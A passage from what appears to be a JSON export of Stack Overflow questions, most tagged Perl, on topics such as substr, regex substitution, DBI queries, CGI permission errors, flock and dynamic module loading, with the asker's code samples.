use=\"literal\"/&gt;\n                &lt;/output&gt;\n            &lt;/operation&gt;\n    &lt;/binding&gt;\n    &lt;service name=\"WorldFunctions\"&gt;\n        &lt;documentation&gt;\n            Simple Hello World SOAP Service.\n        &lt;/documentation&gt;\n        &lt;port name=\"WorldFunctionsWorldFunctionsPort\" binding=\"tns:WorldFunctionsWorldFunctionsBinding\"&gt;\n            &lt;soap:address location=\"http://localhost/world\"/&gt;\n        &lt;/port&gt;\n    &lt;/service&gt;\n&lt;/definitions&gt;\n</code></pre>\n"},{"tags":["perl","substr"],"answer_count":2,"favorite_count":0,"up_vote_count":8,"down_vote_count":0,"view_count":135,"score":8,"question_id":13086078,"title":"Why does substr not return undef at the end of a string?","body":"<p>I'm not sure whether this is defined behaviour or not. I have the following code:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse Data::Dumper;\n\nmy $string = 'aaaaaa0aaaa';\nmy $char = substr($string, length($string), 1);\nmy $char2 = substr($string, length($string)+1, 1);\n\nprint Dumper($char);\nprint Dumper($char2);\n</code></pre>\n\n<p>Besides getting one warning about <code>substr()</code> past the end of a string, I'm confused about the output:</p>\n\n<pre><code>$VAR1 = '';\n$VAR1 = undef;\n</code></pre>\n\n<p><a href=\"http://perldoc.perl.org/functions/substr.html\">Perldoc</a> says about <code>substr</code>:</p>\n\n<blockquote>\n  <p>substr EXPR,OFFSET,LENGTH </p>\n  \n  <p>If OFFSET and LENGTH specify a substring that is partly outside the string, only the part within the string is returned. If the substring is beyond either end of the string, substr() returns the undefined value and produces a warning. </p>\n</blockquote>\n\n<p>Both <code>length($string)</code> and <code>length($string) + 1</code> are beyond the (zero-indexed) end of the string, so I don't know why <code>substr</code> returns the empty string in one case and <code>undef</code> in the other. Does it have to do with the NULL character that C uses for string termination and that is somehow returned by <code>substr</code> in the first case, so that there is an \"invisible\" last character to this string that is not counted by <code>length</code>? Am I missing something obvious here?</p>\n"},{"tags":["perl","templates","mojolicious"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":3,"view_count":78,"score":0,"question_id":12782433,"title":"How to render a template outside of a web request in Mojolicious?","body":"<p>Is there a way to use the Mojolicious rendering engine to render a template outside of a web request?</p>\n"},{"tags":["regex","perl","numbers"],"answer_count":1,"favorite_count":0,"up_vote_count":7,"down_vote_count":2,"view_count":107,"score":5,"question_id":13085561,"title":"Perl regex replace numbers with themselves, just one higher","body":"<p>I have a text, how can I replace all numbers in it with themselves just one higher?</p>\n\n<p>I've tried things like the following:</p>\n\n<pre><code>$buffer_content=~s/(\\d)/($1++)/g;\n</code></pre>\n"},{"tags":["perl"],"answer_count":4,"favorite_count":3,"up_vote_count":10,"down_vote_count":0,"view_count":1086,"score":10,"question_id":2647273,"title":"How can I check if an object has a specific method?","body":"<p>I want to use a method of an object.\nLike <code>$myObject-&gt;helloWorld()</code>.</p>\n\n<p>However there are a couple of methods so I loop through an array of method names and call the method like this:</p>\n\n<pre><code>my $methodName =\"helloWorld\";\n$myObject-&gt;$methodNames;\n</code></pre>\n\n<p>This works quite nice but some objects don't have all methods.</p>\n\n<p>How can I tell whether <code>$myObject</code> has a method called <code>helloWorld</code> or not?</p>\n"},{"tags":["perl","null","undef"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2385,"score":3,"question_id":576536,"title":"How can I print a literal 'null' for undefined values in Perl?","body":"<p>I am running a query 'describe table' and it returns value of 'null' for the 'default' column.  However, when I try to print the value from database to an HTML table it is not printing 'null'.  It is just always blank. </p>\n\n<p>This is how I am storing the data from database:</p>\n\n<pre><code>@nulls = ();\n\nwhile (($null) = $sth1-&gt;fetchrow_array)\n    {\n    push (@nulls, $null);\n    }\n</code></pre>\n\n<p>When I print the contents of array <code>@nulls</code> it never prints the literal value of 'null'.  It is always blank.  Is there a way to overcome this problem?</p>\n"},{"tags":["perl","printf","undef"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":1559,"score":3,"question_id":547042,"title":"How can I render undefined values from printf in Perl?","body":"<p>I'm looking for an elegant way to denote undefined values in situations where formatted numbers usually render. I'll work up a small example. For starters, you of course can't use this:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nfor my $s (1, 1.2, undef, 1.3) {\n    printf \"%5.2f\\n\", $s;\n}\n</code></pre>\n\n<p>...because the 'use warnings' nails you with 'Use of uninitialized value...' on the third iteration. So the next step is something like this:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nfor my $s (1, 1.2, undef, 1.3) {\n    printf \"%5.2f\\n\", $s//0;\n}\n</code></pre>\n\n<p>And, boy, do I like the new 5.10 '//' operator, by the way. But that's really not what I want, either, because the value of $s isn't zero, it's undefined. What I really want is something like this:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nfor my $s (1, 1.2, undef, 1.3) {\n    printf \"%5.2f\\n\", $s//q();\n}\n</code></pre>\n\n<p>...but I can't because this generates the \"Argument \"\" isn't numeric...\" problem on the third value.</p>\n\n<p>This brings me to the doorstep of my question. I can of course write code that checks every number I emit for defined-ness, and that creates a whole different non-%f-based printf format string, but, well, ...yuck.</p>\n\n<p>Has anyone defined a nice way to deal with this type of requirement?</p>\n"},{"tags":["perl","pack"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":1,"view_count":3095,"score":2,"question_id":2427527,"title":"How can I convert a 48 hex string to bytes using Perl?","body":"<p>I have a hex string (length 48 chars) that I want to convert to raw bytes with the <a href=\"http://perldoc.perl.org/functions/pack.html\" rel=\"nofollow\">pack</a> function in order to put it in a Win32 vector of bytes.</p>\n\n<p>How I can do this with Perl?</p>\n"},{"tags":["perl","ascii"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":13058023,"title":"writing a script in perl to convert all files in a folder to another format","body":"<p>Question is 2 fold:</p>\n\n<ol>\n<li><p>I'm writing a perl (not to experienced with perl) script and can get it to convert one file at a time from csv to ascii. I want to do a loop that takes all csv's in a folder and converts them to ascii/txt. </p></li>\n<li><p>Is perl the best language to be attempting this with? I assumed yes since i can successfully do it one file at a time but having a very hard time figuring out a way to loop it. </p></li>\n</ol>\n\n<p>I was trying to figure out how to load all the files into an array then run the loop for each one, but my googling has reached its limit and i'm out of ideas.\nhere's my working script:</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\nuse autodie;\n\nuse open IN =&gt; ':encoding(UTF-16)';\nuse open OUT =&gt; ':encoding(ascii)';\n\nmy $buffer;\n\nopen(my $ifh, '&lt;', 'Software_compname.csv');\nread($ifh, $buffer, -s $ifh);\nclose($ifh);\n\nopen(my $ofh, '&gt;', 'Software_compname.txt');\nprint($ofh $buffer);\nclose($ofh);\n</code></pre>\n"},{"tags":["perl","sed","awk","tr"],"answer_count":8,"favorite_count":0,"up_vote_count":5,"down_vote_count":1,"view_count":118,"score":4,"question_id":13073727,"title":"Replace string with substring in lowercase using sed / awk / tr / perl?","body":"<p>I have a plaintext file containing multiple instances of the pattern <code>$$DATABASE_*$$</code> and the asterisk could be any string of characters.  I'd like to replace the entire instance with whatever is in the asterisk portion, but lowercase.  </p>\n\n<p>Here is a test file:</p>\n\n<pre><code>$$DATABASE_GIBSON$$\n\ntest me $$DATABASE_GIBSON$$ test me\n\n$$DATABASE_GIBSON$$ test $$DATABASE_GIBSON$$ test\n\n$$DATABASE_GIBSON$$ $$DATABASE_GIBSON$$$$DATABASE_GIBSON$$\n</code></pre>\n\n<p>Here is the desired output:</p>\n\n<pre><code>gibson\n\ntest me gibson test me\n\ngibson test gibson test\n\ngibson gibsongibson\n</code></pre>\n\n<p>How do I do this with sed/awk/tr/perl?</p>\n"},{"tags":["java","sql","perl","node.js","quickbooks"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":425,"score":3,"question_id":5722578,"title":"It it possible to grab SQL tables from a QuickBooks QBM file. Perhaps there is an SQLite Database in there?","body":"<p>It would simplify data import for our software if I could export the tables to SQL or CSV or other workable format. We often export from QuickBooks and import into our software and it would be simpler and faster if we could just get the customer's QBM file and then do the rest on our end. We have been exporting individual reports to CSV files, but that is a manual process which we would like to replace with a QBM to SQL tool (or CSV files or Tab Delimited files or other workable format).</p>\n"},{"tags":["perl","dbi"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":13076062,"title":"perl printing out results of a select statement","body":"<p>I'm new at perl. What is the best way to print out the results of a select statement (DBI). I want to be able to print it out to a file (and format it nicely) and also be able to store it in a variable (with formatting (\\n... and stuff)) because I want to be able to email the results so I will either attach the file or use the body. I already have a email module i want to use (MIME::Lite::TT::HTML).\nThanks!! </p>\n"},{"tags":["perl","recursion","data-visualization","family-tree"],"answer_count":3,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":802,"score":5,"question_id":1106480,"title":"How can I construct a family tree with Perl?","body":"<p>I have a programming assignment in Perl that requires me to do the following:</p>\n\n<ol>\n<li><p>Creates a table in a mySQL database, and inserts these records into it:</p></li>\n<li><p>Loads the data from the table into an array of instances of class Son.</p></li>\n<li><p>Using the array, creates HTML code representing a father-son tree, and prints the html code to STDOUT. It's not necessary to make the tree look good. Something like this would be fine:</p></li>\n</ol>\n\n<p><img src=\"http://i25.tinypic.com/314t177.png\" alt=\"tree\" /></p>\n\n<p><strong>I'm running out of ideas, please help.</strong> My code is as follows:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse Son;\nuse CGI;\nuse Data::Dumper;\nuse DBI;\nmy $q = new CGI;\n\n#DB connect vars\nmy $user = \"##\";\nmy $pass = \"##\";\nmy $db = \"##\";\nmy $host = \"localhost\";\n\nmy $dsn = \"DBI:mysql:database=$db;host=$host\";\n\nmy $dbh = DBI-&gt;connect($dsn,$user,$pass);\neval { $dbh-&gt;do(\"DROP TABLE sons\") };\nprint \"Drop failed: $@\\n\" if $@;\n\n$dbh-&gt;do(\"CREATE TABLE sons (son VARCHAR(30) PRIMARY KEY, father VARCHAR(30))\");\n\nmy @rows = ( [\"bill\", \"sam\"],\n    \t[\"bob\", \"\"],\n    \t[\"jack\", \"sam\"],\n    \t[\"jone\", \"mike\"],\n    \t[\"mike\", \"bob\"],\n    \t[\"sam\", \"bob\"]\n);\n\nfor my $i (0 .. $#rows) {\n    $dbh-&gt;do(\"INSERT INTO sons (son, father) VALUES (?,?)\",  {}, $rows[$i][0], $rows[$i][1]);\t\n}\n\nour @sons_array;\nmy $sth = $dbh-&gt;prepare(\"SELECT * FROM sons\");\n$sth-&gt;execute();\nwhile (my $ref = $sth-&gt;fetchrow_hashref()) {\n    $sons_array[++$#sons_array] = Son-&gt;new($ref-&gt;{'son'}, $ref-&gt;{'father'});\n}\n$sth-&gt;finish();\n$dbh-&gt;disconnect();\n\n\nprint $q-&gt;header(\"text/html\"),$q-&gt;start_html(\"Perl CGI\");\nprint \"\\n\\n\";\nconstructFamilyTree(@sons_array, '');\nprint $q-&gt;end_html;\n\nsub constructFamilyTree {\n    my @sons_array = @_[0..$#_ -1];\n    my $print_father;\n    my $print_son;\n    my $print_relation;\n    my $current_parent = @_[$#_];\n    my @new_sons_array;\n    my @new_siblings;\n\n    #print $current_parent.\"\\n\";\n    foreach my $item (@sons_array){\n    \tif(!$item-&gt;{'son'} || $item-&gt;{'son'} eq $item-&gt;{'father'}) { # == ($item-&gt;{'son'} eq '')\n    \t\tprint \"\\n List contains bad data\\n\";\n    \t\treturn 0;\n    \t}\n\n    \tif($item-&gt;{'father'} eq $current_parent) {\n    \t\tmy $temp_print_relation;\n    \t\tforeach my $child (@sons_array) {\n    \t\t\tif($child-&gt;{'father'} eq $item-&gt;{'son'}) {\n    \t\t\t\tif(!$temp_print_relation) {\n    \t\t\t\t\t$temp_print_relation .= '   |';\n    \t\t\t\t}\n    \t\t\t\telse {\n    \t\t\t\t\t$temp_print_relation .= '-----|';\n    \t\t\t\t}\n    \t\t\t}\n    \t\t}\n    \t\t$print_relation .= $temp_print_relation.\"   \";\n    \t\t$print_son .= '('.$item-&gt;{'son'}.')  ';\n    \t\t@new_siblings[++$#new_siblings] = $item;\n    \t\t$print_father = $item-&gt;{'father'};\n    \t}\n    \telse {\n    \t\t$new_sons_array[++$#new_sons_array] = $item;\n    \t}\n    }\n\n    print $print_son. \"\\n\". $print_relation.\"\\n\";\n    #print $print_father.\"\\n\";\n    #print $print_relation  . \"\\n\". $print_son;\n    foreach my $item (@new_siblings) {\n    \tconstructFamilyTree(@new_sons_array, $item-&gt;{'son'});\n    }\t\n}\n\n\nperl module:\n#File Son.pm, module for class Son\n\npackage Son;\n\nsub new {\n    my($class, $son, $father) = @_;\n    my $self = {'son' =&gt; $son,\n    \t\t  'father' =&gt; $father};\n\n    bless $self, $class;\n    return $self;\n}\n\n1;\n</code></pre>\n"},{"tags":["python","regex","perl"],"answer_count":11,"favorite_count":1,"up_vote_count":5,"down_vote_count":1,"view_count":523,"score":4,"question_id":5671409,"title":"Regular Expression GUI?","body":"<p>I've just started looking at regular expressions, and they are pretty cool.  They are also pretty annoying looking, and I really don't want to 'learn' them if I can avoid it.</p>\n\n<p>Which is why a nice gui would be great.  I'm looking for something intuitive, where you can drag and drop 'condition boxes', select which conditions you want them to select for, get a list of things that your conditions go against, etc.  Something which makes building regular expressions easy... heh</p>\n\n<p>If anyone knows of anything, let me know!</p>\n\n<p>Edit: Thanks for all the responses.   After looking at some, I googled questions based on them and found this link:  <a href=\"http://stackoverflow.com/questions/89718/is-there-anything-like-regexbuddy-in-the-open-source-world\">Is there anything like RegexBuddy in the open source world?</a></p>\n\n<p>Quickrex seems to have alot of the stuff I want (although not as good as some), plus its integrated into eclipse, which is the IDE I use at the moment.</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":38,"score":-3,"question_id":13060844,"title":"Using case statements to retrieve information from a web page using Perl","body":"<p>I am currently trying to extract and break up information for a Web page that contains temperature readings. I am a complete beginner when it comes to Perl and I'm having some trouble. The page I'm trying to extract information from is: <a href=\"http://temptrax.itworks.com/temp\" rel=\"nofollow\">http://temptrax.itworks.com/temp</a>.\nSo far I was able to figure out how to get the page and break up the four temperature readings into four lines using split. Here is what I was able to come up with so far:</p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings;\nuse LWP::Simple;\nuse v5.10.1;\n\nmy $content = get('http://temptrax.itworks.com/temp');\nmy @split = split ('Probe',$content);\n\nforeach my $split(@split){\n$split =~ s/'Probe''|'/ /g;\n\nprint $split . \"\\n\";\n\n}\n</code></pre>\n\n<p>The next step that I'm having trouble with is separating the four temperature reading using case statements. I don't quite understand how to do them. I want to be able to get a readings for each each probe separately when giving a specific number 1-4. What's the best way to do this?</p>\n"},{"tags":["perl","apache","cgi"],"answer_count":3,"favorite_count":2,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":13063237,"title":"cgi perl scripts not working, only cgi bash scripts are working?","body":"<p>i am having strange problem., </p>\n\n<p>from <strong>command line cgi bash scripts and cgi perl scripts are working</strong>,  but <strong>from browser only cgi bash scripts are working and not the cgi perl</strong>.</p>\n\n<p>after accessing cgi perl scripts from browser i get <strong>500 Internal server error</strong>.</p>\n\n<pre><code>and apache error log says\n\n[Thu Oct 25 01:58:59 2012] [error] [client x.x.x.x] (13)Permission denied: exec of '/home/x/x/x/x/public_html/cgi-bin/test.cgi' failed\n[Thu Oct 25 01:58:59 2012] [error] [client x.x.x.x] Premature end of script headers: test.cgi\n</code></pre>\n\n<p>i want to run cgi perl scripts from browser .</p>\n\n<p>how do i do it.</p>\n\n<pre><code>[root@www ~]# which perl\n/usr/bin/perl\n\n[root@www cgi-bin]# perl test.cgi\nContent-type: text/plain\n\ntesting...\n</code></pre>\n\n<p>source of test.cgi</p>\n\n<pre><code>#!/usr/bin/perl\n\nprint \"Content-type: text/plain\\n\\n\";\nprint \"testing...\\n\";\n</code></pre>\n\n<p>Thanks for your time.</p>\n\n<p>its a dedicated server with apache 2.</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":13079893,"title":"Perl - how to write changes to a file instead of seeing the console output only","body":"<p>I found this command on SO which is exactly what I wanted to know but I only see the console output. I need the command to re-write the file it's working on (file.txt). This command takes every number (well, positive integer) in a file that is greater than 400 and add 13 to it.</p>\n\n<pre><code>perl -pe 's/\\d+/$&amp; &gt; 400 ? $&amp;+13 : $&amp;/ge' file.txt\n</code></pre>\n"},{"tags":["perl"],"answer_count":6,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":5023,"score":6,"question_id":197933,"title":"What's the best way to clear the screen in Perl?","body":"<p>Ideally, something cross-platform.</p>\n"},{"tags":["perl","postgresql","error-handling"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":13069873,"title":"Perl DBI connection to PostgreSQL doesn't die() on database error","body":"<p>I am used to Perl \"crashing\" my script when a SQL goes bad, but Postgres is just giving the error to the Apache error log and the script continues. Evil behaviour for debugging code.</p>\n\n<p>Now I have asked the Oracle of Google but either I am asking the wrong questions or, very unlikely, I am the only one with that problem. ;)</p>\n\n<p>In Short: I want the same fault behaviour with Postgres as MySQL does, ie, \"crash\" the script and take heed of <code>use CGI::Carp qw(fatalsToBrowser);</code> and just show me the faulty SQL statement. </p>\n\n<p>I am using good old <code>DBI</code> to access the PG-DB, Postgres 8.4 and Perl 5.10.1 on Ubuntu 10.04 on my server, if that matters. All packages are from the official rep.</p>\n\n<p>EDIT:\nThanks to Richard Huxton this is solved, leaving the solution for others to find.</p>\n\n<pre><code>our $dbh = DBI-&gt;connect($DBUrl, $DBUser, $DBPass,{ RaiseError =&gt; 1}\n           ) || die \"Could not connect to database: $DBI::errstr\";\n</code></pre>\n"},{"tags":["regex","perl","escaping"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":13077868,"title":"Escaping wildcard file paths perl","body":"<p>I have an array of files:</p>\n\n<pre><code>my @plistFiles = glob('Logs/*/*.plist');\n</code></pre>\n\n<p>which I need to escape, that will contain '(' and ')' as well as the usual spaces.</p>\n\n<p>Here is one of the file paths @plistFiles will return: </p>\n\n<pre><code>Logs/Run 1 (13)/Automation Results.plist\n</code></pre>\n\n<p>I currently have this code for escaping spaces in file paths which I pass to a command in the Terminal in OSX:</p>\n\n<pre><code>$plistFile =~ s/\\ /\\\\\\ /g;\n</code></pre>\n\n<p>So how can I edit this regex to also escape ( and )?</p>\n\n<p>Would this be correct just for escaping ( and )?:</p>\n\n<pre><code>$plistFile =~ s/\\(\\d)/\\\\\\(\\d\\\\\\)/g;\n</code></pre>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":51,"score":0,"question_id":13074601,"title":"Printing specific line from a hash in perl","body":"<p>My question is how can I print a specific line from a hash. The code so far(Thank you Joel Berger for it) is: </p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\nuse warnings;\n\nuse LWP::Simple;\n\nmy $content = get('http://temptrax.itworks.com/temp');\nmy %probes = $content =~ /Probe\\s*(\\d)\\|\\s*(\\-?[\\d\\.]+)/gx;\n\nforeach my $probe (sort keys %probes) {\n  print \"$probe =&gt; $probes{$probe}\\n\";\n}\n</code></pre>\n\n<p>The output of it is:</p>\n\n<pre><code>1 =&gt; 74.0\n2 =&gt; -99.9\n3 =&gt; 74.4\n4 =&gt; 68.1\n</code></pre>\n\n<p>How can I get a specific line to print? Such as if I put in number 1, then only line 1 would print. Thank you for taking a look at this.</p>\n\n<p>UPDATE: I was finally able to figure it out after some reading</p>\n\n<pre><code>#!/usr/bin/env perl\nuse v5.10.1;\nuse strict;\nuse warnings;\n\nuse LWP::Simple;\n\nmy $content = get('http://temptrax.itworks.com/temp');\nmy %probes = $content =~ /Probe\\s*(\\d)\\|\\s*(\\-?[\\d\\.]+)/gx;\n\nfor ($ARGV[0]) {\n  when(1) {print \"$probes{1}\\n\"; }\n  when(2) {print \"$probes{2}\\n\"; }\n  when(3) {print \"$probes{3}\\n\"; }\n  when(4) {print \"$probes{4}\\n\"; }\n  default {print \"error\"; }\n}\n</code></pre>\n\n<p>UPDATE2: Figured out an even easier way to do it</p>\n\n<pre><code>#!/usr/bin/env perl\nuse v5.10.1;\nuse warnings;\n\nuse LWP::Simple;\n\nmy $content = get('http://temptrax.itworks.com/temp');\nmy %probes = $content =~ /Probe\\s*(\\d)\\|\\s*(\\-?[\\d\\.]+)/gx;\n\n$MyVar = $ARGV[0];\nprint $probes{$MyVar};\n</code></pre>\n"},{"tags":["regex","perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":96,"score":1,"question_id":13077043,"title":"Match different variant of a word using regex Perl","body":"<p>I am splitting sentences at individual space characters, and then matching these terms against keys of hashes. I am getting matches only if the terms are 100% similar, and I am struggling to find a perfect regex that could match several occurances of the same word. Eg. Let us consider I have a term 'antagon' now it perfectly matches with the term 'antagon' but fails to match with antagonists, antagonistic or pre-antagonistic, hydro-antagonist etc. Also I need a regex to match occurances of words like MCF-7 with MCF7 or MC-F7 silencing the effect of special characters and so on.</p>\n\n<p>This is the code that I have till now and commented part is where I am struggling.<br>\n(Note: Terms in the hash are stemmed to root form of a word).</p>\n\n<pre><code>    use warnings;\n    use strict;\n    use Drug;\n    use Stop;\n    open IN,  \"sample.txt\"   or die \"cannot find sample\";\n    open OUT, \"&gt;sample1.txt\" or die \"cannot find sample\";\n\n    while (&lt;IN&gt;) {\n        chomp $_;\n        my $flag = 0;\n        my $line = lc $_;\n        my @full = ();\n        if ( $line =~ /&lt;Sentence.*&gt;(.*)&lt;\\/Sentence&gt;/i ) {\n            my $string = $1;\n            chomp $string;\n            $string =~ s/,/ , /g;\n            $string =~ s/\\./ \\. /g;\n            $string =~ s/;/ ; /g;\n            $string =~ s/\\(/ ( /g;\n            $string =~ s/\\)/ )/g;\n            $string =~ s/\\:/ : /g;\n            $string =~ s/\\::/ :: )/g;\n            my @array = split / /, $string;\n\n            foreach my $word (@array) {\n                chomp $word;\n                if ( $word =~ /\\,|\\;|\\.|\\(|\\)/g ) {\n                    push( @full, $word );\n                }\n                if ( $Stop_words{$word} ) {\n                    push( @full, $word );\n                }\n\n                if ( $Values{$word} ) {\n                    my $term = \"&lt;Drug&gt;$word&lt;\\/Drug&gt;\";\n                    push( @full, $term );\n                }\n                else {\n                    push( @full, $word );\n                }\n\n                # if($word=~/.*\\Q$Values{$word}\\E/i)#Changed this\n                # {\n                # $term=\"&lt;Drug&gt;$word&lt;/$Drug&gt;\";\n                # print $term,\"\\n\";\n                # push(@full,$term);\n                # }\n            }\n        }\n        my $mod_str = join( \" \", @full );\n        print OUT $mod_str, \"\\n\";\n    }\n</code></pre>\n"},{"tags":["ruby","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":13076815,"title":"Perl substitute inserting junk when not asked as used in Ruby %x{}","body":"<p>So I am running this one liner:</p>\n\n<pre><code> perl -i -pe 's|[^\\d\\n]||g' country-ids.txt\n</code></pre>\n\n<p>To substitute text in a file that looks like this:</p>\n\n<pre><code># encoding: utf-8\nfiles_to_change = [\"db_owners.txt\", \"db_vessels.txt\"]\nfiles_to_change.each do |file|\n    text = File.read(file)\n,\"1\")\n,\"1\")\n,\"2\")\n,\"2\")\n,\"3\")\n</code></pre>\n\n<p>My goal is to strip each line of all non-digit characters while keeping the lines at their original places.</p>\n\n<p>Instead of the result I want, I am getting this:</p>\n\n<pre><code>d\ndd\nd\nd\n&lt;blank space&gt;\n</code></pre>\n\n<p>Not sure what's going on. The reason I am preserving the new line is because the last time I ran it without the newline in the \"find\" character class all I got was one really, really long line of digits.</p>\n\n<p>I am running this in a .rb script by using %x{command} if that makes any difference.</p>\n\n<p>edit:</p>\n\n<p>Here's the entire script. Still getting the same issue. Not sure why.</p>\n\n<pre><code>%x{cut -f 2 -d/ script-substitute-countries-with-id.rb &gt; countries2.txt}\n%x{cut -f 2 db_vessels.txt &gt; countries.txt}\n%x{cut -f 3 -d/ script-substitute-countries-with-id.rb &gt; country-ids.txt}\n%x{perl -i -pe 's:[^\\d]::g' country-ids.txt}\n%x{join countries2.txt country-ids.txt &gt; countries2.txt.tmp}\n%x{mv countries2.txt.tmp countries2.txt}\n%x{cat countries.txt countries2.txt &gt; countries.txt}\n%x{uniq countries.txt &gt; countries.txt.tmp}\n%x{mv countries.txt.tmp countries.txt}\n</code></pre>\n"},{"tags":["perl","hash","global-variables","subroutine"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":58,"score":0,"question_id":13076804,"title":"Accessing global hash in a subroutine in perl","body":"<p>I have created a global hash and when I try to access that hash from within a perl sub routine, it is not able to access it.</p>\n\n<p>I have declared it as:\n    <code>%HASH = ();</code></p>\n\n<p>and trying to access it in a subroutine as :</p>\n\n<pre><code>$HASH{$key} = $value;\n</code></pre>\n\n<p>Please guide me if I am doing something wrong</p>\n"},{"tags":["perl","vim","syntax-error"],"answer_count":6,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":6510,"score":3,"question_id":1793305,"title":"How do I fix the perl syntax error \"missing right curly or square bracket\" using VIM?","body":"<p>Compiling (or executing) a perl program with unmatched array braces (\"[ ]\") or scope brackets (\"{ }\") causes the \"missing right curly or square bracket\" syntax error. Perl often reports the source as your last code line (\"at EOF\"), which could be far removed from the actual missing piece.</p>\n\n<p>Example perl error message:</p>\n\n<pre><code>Missing right curly or square bracket at ./foo.pl line 100, at end of line\nsyntax error at ./foo.pl line 100, at EOF\nExecution of ./foo.pl aborted due to compilation errors.\n</code></pre>\n\n<p>How do vi or Vi IMproved (VIM) users troubleshoot this error message? I've added an answer with some VIM enhancements. Please add your own ideas, practices, or vi plugins.</p>\n\n<p>NOTE: Original question posted with VIM version that didn't highlight perl braces and brackets. Many newer versions do this; see <a href=\"http://www.vim.org/\" rel=\"nofollow\">vim.org</a> for more info.</p>\n"},{"tags":["linux","perl","locking","flock"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12651068,"title":"Release of flock in case of errors?","body":"<p>Imagine the following Perl code (here in pseudo code):</p>\n\n<pre><code>successfully acquired flock for FILEHANDLER       # line 1\nsome error or maybe simply a call to exit()       # line 2\nclose FILEHANDLER (which also releases the lock)  # line 3\n</code></pre>\n\n<p>In this case I wouldn't release the lock, as the perl script ends in line 2. In that case, is the lock ever released by the operating system? Does it see \"hey, the script that aquired the lock crashed\" and release the lock? Does it release the lock immediately? Also, is there one perl instance running for each script, so that it's clear which script crashed/stopped without releasing the lock? </p>\n"},{"tags":["perl","module","use"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":76,"score":4,"question_id":13071319,"title":"perl: \"unincluding\" modules","body":"<p>so, i have a program like this:  </p>\n\n<pre><code>#!/usr/bin/perl -w  \nuse strict;  \nforeach (@data) {  \n    if($_ eq \"foo\") {  \n        use Foo;\n        process();\n    }  \n    if($_ eq \"bar\") {  \n        use Bar;\n        process();\n    }  \n...  \n}\n</code></pre>\n\n<p>Each included module is somewhat similar, the only difference being what the process()-sub does. </p>\n\n<pre><code>#!/usr/bin/perl -w  \nuse strict;  \nsub process {  \n...  \n}\n</code></pre>\n\n<p>My issue: the input for the main script is a (possibly long) list of things, while processing that list i get continuous \"Subroutine redefined\" errors (obviously). Is there any way to \"un-use\" a module?<br>\nDue to the fact that the library of possible \"actions\" to include may grow in the future, i thought this way of including modules dynamically would be the best approach. Many thanks for your help :)</p>\n"},{"tags":["regex","perl","perl-module","perl-data-structures"],"answer_count":4,"favorite_count":2,"up_vote_count":10,"down_vote_count":0,"view_count":394,"score":10,"question_id":11369907,"title":"How do I retrieve an integer's ordinal suffix in Perl (like st, nd, rd, th)","body":"<p>I have number and need to add the suffix: 'st', 'nd', 'rd', 'th'. So for example: if the number is 42 the suffix is 'nd' , 521 is 'st' and 113 is 'th' and so on.\nI need to do this in perl. Any pointers.</p>\n"},{"tags":["mysql","perl","dbi"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":75,"score":4,"question_id":13075491,"title":"Why '1.66' does not match 1.66 in MySQL in double-field?","body":"<p>I wondered, why my queries formed in Perl code using DBI did not returned correct records. I had simple queries like :</p>\n\n<pre><code>my $query = \"SELECT id FROM table WHERE title = ? AND price = ?\";\n</code></pre>\n\n<p>I executed it like:</p>\n\n<pre><code>my $sth = $dbh-&gt;prepare( $query );\nmy ($id) = $dbh-&gt;selectcol_arrayref( $sth, undef, $title, $price );\n</code></pre>\n\n<p>Most time everything worked fine but in some rare cases i did not get results i expected. So i tried from CLI too. Fulled query with dubious values:</p>\n\n<pre><code>SELECT id FROM table WHERE title = 'Some title' AND price = 1.66;\n</code></pre>\n\n<p>And got desired records back. After that i <strong>quoted</strong> price value too:</p>\n\n<pre><code>SELECT id FROM table WHERE title = 'Some title' AND price = '1.66';\n</code></pre>\n\n<p>And got <strong>zero</strong> records as result. </p>\n\n<p>After that I tried with other quoted price values, like '1.67' and they worked fine.</p>\n\n<p>What is problem here? Why such simple queries fail? To reproduce behaviour i put simple schema and query up to <a href=\"http://sqlfiddle.com/#!8/b7847/7/0\" rel=\"nofollow\">sqlfiddle</a>, As you may see simple query <code>SELECT * FROM Table1 WHERE price = '1.66' OR price = '1.67';</code> gives only one result. </p>\n\n<p>I feel, it may be related to the nature of double 